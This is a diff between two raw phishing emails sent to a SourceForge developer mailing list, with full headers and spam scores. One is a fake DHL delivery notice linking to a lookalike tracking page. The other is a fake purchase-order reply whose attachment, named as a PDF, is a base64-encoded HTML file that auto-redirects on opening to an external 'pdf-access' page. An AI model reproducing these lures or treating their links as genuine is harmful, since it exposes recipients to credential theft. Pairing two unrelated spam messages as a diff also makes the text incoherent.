@@ -2,67 +2,97 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 86B80E518B
-	for <lists+industrypack-devel@lfdr.de>; Fri, 25 Oct 2019 18:48:26 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id A51D2E8618
+	for <lists+industrypack-devel@lfdr.de>; Tue, 29 Oct 2019 11:51:25 +0100 (CET)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=lists.sourceforge.net; s=beta; h=Reply-To:From:List-Subscribe:List-Help:
+	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Content-Type:
+	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
+	bh=Tk4jI04uT1oeGKIHKs+l5c0YAePbucHmsDbq59pq0P4=; b=aKzei1zHo2hm9eErYKawlRZN2P
+	tRQeSINPivobdJc88m6Y+nNn0sZ7fkI6a4FECLWoRfASPLgyGbHQxvt/hYCdfRd+psn4d5kaifJYJ
+	gM2CFXtTJp6JE4NMVYsbwmuiHZpVuaKHfSrMh1zFyk9PTwV7Z6lMS5lI/Sh8gEaB+Lnk=;
 Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
 	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1iO2lF-0001NZ-9y
-	for lists+industrypack-devel@lfdr.de; Fri, 25 Oct 2019 16:48:25 +0000
+	id 1iPP5w-0004LE-G8
+	for lists+industrypack-devel@lfdr.de; Tue, 29 Oct 2019 10:51:24 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
  by sfs-ml-4.v29.lw.sourceforge.com with esmtps
  (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
- (envelope-from <zzzsmz3@kagoya.net>) id 1iO2lD-0001NQ-Sj
- for industrypack-devel@lists.sourceforge.net; Fri, 25 Oct 2019 16:48:23 +0000
+ (envelope-from <info@azulejosbenadresa.ga>) id 1iPP5v-0004L4-OM
+ for industrypack-devel@lists.sourceforge.net; Tue, 29 Oct 2019 10:51:23 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
- :Message-ID:Subject:From:To:Date:Sender:Reply-To:Cc:Content-ID:
+ d=sourceforge.net; s=x; h=Subject:Content-Type:MIME-Version:Message-ID:Date:
+ To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=XoVEwBzWFB89xJVx/1dTHK+eCX2RPm1KzPyqho8GNTo=; b=W5UeMaZoHGF6tX9MNM7dtCraMr
- gWRuQqRQP9J5r+3RtM2q+EZJVay3jJG++Y0CBbZD+b4YPGogvLDyFR6pxUuOOO4QlNkfFExhKNck6
- 9P7aiZrFoHa95FoJ1LoFG11NoGUhqLDAUdkJ19c7J8YI3UzodlAHZMTrk/s+2bwfAB9U=;
+ bh=po3pGbyrlakO9v++4CSDQH0NTHE571BOoOK6iISAT2k=; b=TEpTGly3GNyPSHiYD6Bx3F13E8
+ NpBy45yNyTS6eo+8oLZKxFKT0HYRdltVbJ42K/uxmdnDCIOXytmx6Jch/9cbCs1Vk52O04+Ww2c2+
+ fSmZQUPkpTSNvjfd3GVHp9xrexQcpsVADavCwj9WAiPb7cJpOef95z8n2P9IUG2iO4zY=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Subject:
- From:To:Date:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
+ h=Subject:Content-Type:MIME-Version:Message-ID:Date:To:From:Sender:Reply-To
+ :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
  Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=XoVEwBzWFB89xJVx/1dTHK+eCX2RPm1KzPyqho8GNTo=; b=S
- Mig++eTDk8RHpIgwTxKJaVG0IxmFo8+3Sv3fKzPjbCAHvYlM5QbImS0FppiTlYN0Z1Bwy2jYjAQC7
- 1A4v8G6bMFlM9cB5V2DjoMS5KkzAiugWQa9jb9fvrBDrvorCSkb/4XOh+DUnUhVNstv0FtvB2S4fb
- mG4AKW8UjV8FFDKo=;
-Received: from o4022-121.kagoya.net ([133.18.9.210])
- by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.92.2)
- id 1iO2lB-00Gweg-Lf
- for industrypack-devel@lists.sourceforge.net; Fri, 25 Oct 2019 16:48:23 +0000
-Received: by o4022-121.kagoya.net (Postfix, from userid 499206)
- id 7221B381338; Sat, 26 Oct 2019 00:25:38 +0900 (JST)
-Date: Fri, 25 Oct 2019 15:25:38 +0000
+ List-Owner:List-Archive; bh=po3pGbyrlakO9v++4CSDQH0NTHE571BOoOK6iISAT2k=; b=J
+ aV/FV/9MhWDtZysbksLFq94k8H/kyHQ9ZKIaO/A5CCZedZ3lRYTbr4kSiF3Xa9RuYxngQ2WdYH7hg
+ 9Z1zP9+2kIsEi6OQ3w0KfHAYnwoFU2jaIzdIzZlVN1zI7ZJsVw2ed8GbCheo3nQaAhje8dqYWtz5W
+ XdabTTHsOyvXaXKE=;
+Received: from info0.azulejosbenadresa.ga ([192.236.179.24])
+ by sfi-mx-1.v28.lw.sourceforge.com with esmtps
+ (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
+ id 1iPP5u-005mEM-5g
+ for industrypack-devel@lists.sourceforge.net; Tue, 29 Oct 2019 10:51:23 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
+ d=azulejosbenadresa.ga; 
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ i=info@azulejosbenadresa.ga;
+ bh=po3pGbyrlakO9v++4CSDQH0NTHE571BOoOK6iISAT2k=;
+ b=m1bmNVsCrluWsRhpHo95N9W4NfwTADM26e33kIzRppRxbQC4aT6kWqoVF8w97Ji87zCnmNNx18wV
+ Fcwf9YdwssTYSCBCw1NQtjuq2abvpdS9XEtA6fOSA+jK/AeBVF/efDh+7wfkZVWOVwBUW0Wu/LPj
+ ws2VPw4HBU6+MIqCyws=
 To: industrypack-devel@lists.sourceforge.net
-From: DHL DELIVERY SERVICE <dhldeliveryservice5@nk-bbw.net>
-Message-ID: <969c3ea22c6e1c4d7064d5006fe68e71@nk-bbw.net>
-X-Priority: 1
+Date: 29 Oct 2019 03:51:14 -0700
+Message-ID: <20191029035114.500300DA44D4BC6D@azulejosbenadresa.ga>
 MIME-Version: 1.0
-X-Spam-Score: 6.7 (++++++)
+Content-Type: multipart/mixed;
+ boundary="----=_NextPart_000_0012_B52596C0.7688D12A"
+X-Spam-Score: 8.3 (++++++++)
 X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
  See http://spamassassin.org/tag/ for more details.
  0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
  See
  http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
- for more information. [URIs: burrow.io]
- 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
- domains are different
- 0.5 SUBJ_ALL_CAPS          Subject is all capitals
+ for more information. [URIs: azulejosbenadresa.ga]
+ 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
+ blocklist [URIs: azulejosbenadresa.ga]
+ 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+ [Blocked - see <https://www.spamcop.net/bl.shtml?192.236.179.24>]
+ 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
+ [192.236.179.24 listed in zen.spamhaus.org]
+ 0.1 URIBL_CSS_A Contains URL's A record listed in the Spamhaus CSS
+ blocklist [URIs: azulejosbenadresa.ga]
+ 0.1 URIBL_CSS Contains an URL's NS IP listed in the Spamhaus CSS
+ blocklist [URIs: azulejosbenadresa.ga]
  -0.0 SPF_PASS               SPF: sender matches SPF record
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+ 0.1 HTML_TAG_BALANCE_BODY  BODY: HTML has unbalanced "body" tags
  1.0 HTML_MESSAGE           BODY: HTML included in message
- 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
- 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
- 2.0 TO_NO_BRKTS_HTML_ONLY  To: lacks brackets and HTML only
-X-Headers-End: 1iO2lB-00Gweg-Lf
-Subject: [Industrypack-devel] =?utf-8?q?DHL_PACKAGE_DELIVERY?=
+ -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
+ domain
+ -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
+ 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
+ not necessarily valid
+ 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
+ -0.2 AWL AWL: Adjusted score from AWL reputation of From: address
+X-VA-Spam-Flag: YES
+X-Spam-Flag: YES
+X-Headers-End: 1iPP5u-005mEM-5g
+Subject: [Industrypack-devel] [SPAM] Re: Complete PO-008293 For Review
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -74,34 +104,57 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============1807459197729543876=="
+From: info--- via Industrypack-devel <industrypack-devel@lists.sourceforge.net>
+Reply-To: info@azulejosbenadresa.ga
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
---===============1807459197729543876==
-Content-Type: text/html; charset=UTF-8
-Content-Transfer-Encoding: 8bit
+This is a multi-part message in MIME format.
 
-<SPAN style='FONT-SIZE: 116px; FONT-FAMILY: "times new roman","new york",times,serif; BORDER-RIGHT-WIDTH: 1px; BORDER-TOP-COLOR: rgb(48,121,237); WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 1px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: bold; COLOR: rgb(188,9,19); FONT-STYLE: normal; BORDER-BOTTOM-COLOR: rgb(48,121,237); TEXT-ALIGN: center; PADDING-LEFT: 8px; MIN-HEIGHT: 49px; ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-COLOR: rgb(48,121,237); LETTER-SPACING: normal; LINE-HEIGHT: 49px; PADDING-RIGHT: 8px; BORDER-TOP-WIDTH: 1px; BACKGROUND-COLOR: rgb(255,182,4); TEXT-INDENT: 0px'><SPAN style="FONT-SIZE: large; FONT-FAMILY: Georgia" size="4"><B><I>=D H L=</I></B></SPAN></SPAN><SPAN style='FONT-SIZE: 14px; FONT-FAMILY: Helvetica,"Microsoft Yahei",verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; TEXT-INDENT: 0px'>
-<P style='FONT-SIZE: 16px; FONT-FAMILY: "times new roman","new york",times,serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: 27px; TEXT-INDENT: 0px'><BR><SPAN style="FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; COLOR: rgb(34,34,34)"><SPAN style="FONT-FAMILY: verdana,sans-serif; COLOR: rgb(0,0,0)" face="verdana, sans-serif">Dear Industrypack-devel,</SPAN><BR><BR>Your business partner sent you a package sent to you via our courier service。<BR><BR>Before we start the final delivery to your address, we need to confirm that you are the actual recipient.。<BR><BR></SPAN><SPAN style="FONT-SIZE: medium; FONT-FAMILY: verdana,sans-serif" size="3" face="verdana, sans-serif">Please click below to confirm your shipping address with us to ensure smooth and fast delivery。</SPAN></P><SPAN style="FONT-SIZE: medium; FONT-FAMILY:
-  verdana,sans-serif" size="3" face="verdana, sans-serif"></SPAN>
-<P style='FONT-SIZE: 16px; FONT-FAMILY: "times new roman","new york",times,serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: 27px; TEXT-INDENT: 0px'><BR style="FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; COLOR: rgb(34,34,34)"><SPAN style='FONT-SIZE: 16px; FONT-FAMILY: "times new roman","new york",times,serif; BORDER-RIGHT-WIDTH: 1px; BORDER-TOP-COLOR: rgb(48,121,237); WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 1px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: bold; COLOR: rgb(188,9,19); FONT-STYLE: normal; BORDER-BOTTOM-COLOR: rgb(48,121,237); TEXT-ALIGN: center; PADDING-LEFT: 8px; MIN-HEIGHT: 49px; ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-COLOR: rgb(48,121,237); LETTER-SPACING: normal; LINE-HEIGHT: 49px; PADDING-RIGHT: 8px; BORDER-TOP-WIDTH: 1px; BACKGROUND-COLOR: rgb(255,182,4); TEXT-INDENT: 0px'><SPAN style="
- FONT-SIZE: large; FONT-FAMILY: Georgia" size="4"><U><A href="https://canzzz.burrow.io/newrr1/?lists.sourceforge.net
-=Industrypack-devel&raven=Industrypack-devel@lists.sourceforge.net
-&ggggggggghtytytyjjitytjhtyryyggfyyhg">Tracking Your DHL Package</A></U><EM>    </EM></SPAN></SPAN><SPAN style='FONT-SIZE: 14px; FONT-FAMILY: Helvetica,"Microsoft Yahei",verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; TEXT-INDENT: 0px'><SPAN> </SPAN></SPAN></P>
-<P style='FONT-SIZE: 16px; FONT-FAMILY: "times new roman","new york",times,serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: 27px; TEXT-INDENT: 0px'><SPAN style='FONT-SIZE: 14px; FONT-FAMILY: Helvetica,"Microsoft Yahei",verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; TEXT-INDENT: 0px'><SPAN></SPAN></SPAN><BR style="FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; COLOR: rgb(34,34,34)"><SPAN style="FONT-SIZE: small; FONT-FAMILY: verdana,sans-serif" face="verdana, sans-serif">if you can't verify your address can result in delayed delivery or loss of important file。</SPAN><BR style="FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; COLOR: rgb(34,3
- 4,34)"><BR style="FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; COLOR: rgb(34,34,34)"></P>
-<DIV style="FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px" dir=ltr>heartfelt,</DIV>
-<DIV style="FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px" dir=ltr>DHL Worldwide Delivery</DIV>
+------=_NextPart_000_0012_B52596C0.7688D12A
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
 
---===============1807459197729543876==
+Sorry for delay.
+
+I have attached complete order for immediate processing, also=20
+feel free to get back to me with any corrections if need be.
+
+----=C2=A0
+
+Regards,
+
+Azulejo Ltd
+info@azulejosbenadresa.ga
+Cell: +34 660 291 815
+ST/Av.del Mar 61, 6B
+C.P. 12003
+Castellon
+
+------=_NextPart_000_0012_B52596C0.7688D12A
+Content-Type: text/html; name="PO_008293_Complete_Order.pdf.htm"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="PO_008293_Complete_Order.pdf.htm"
+
+PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlv
+bmFsLy9FTiINCg0KImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRy
+YW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkv
+eGh0bWwiPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRl
+bnQ9InRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xIiAvPg0KPG1ldGEgaHR0cC1lcXVp
+dj0iUkVGUkVTSCJjb250ZW50PSIxO3VybD1odHRwczovL2Rpc3EudXMvP3VybD1odHRwcyUz
+QSUyRiUyRmxpdmUtb3dlLWZpbGUuY2YlMkZwZGYtYWNjZXNzJmtleT1VTktvTmNuZDVla044
+U1BtYzlSTmJRIj4NCjx0aXRsZT5Eb2N1bWVudDwvdGl0bGU+DQo8L2hlYWQ+DQoNCjxib2R5
+Pg==
+
+------=_NextPart_000_0012_B52596C0.7688D12A
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============1807459197729543876==
+------=_NextPart_000_0012_B52596C0.7688D12A
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -112,4 +165,6 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============1807459197729543876==--
+------=_NextPart_000_0012_B52596C0.7688D12A--
+
+
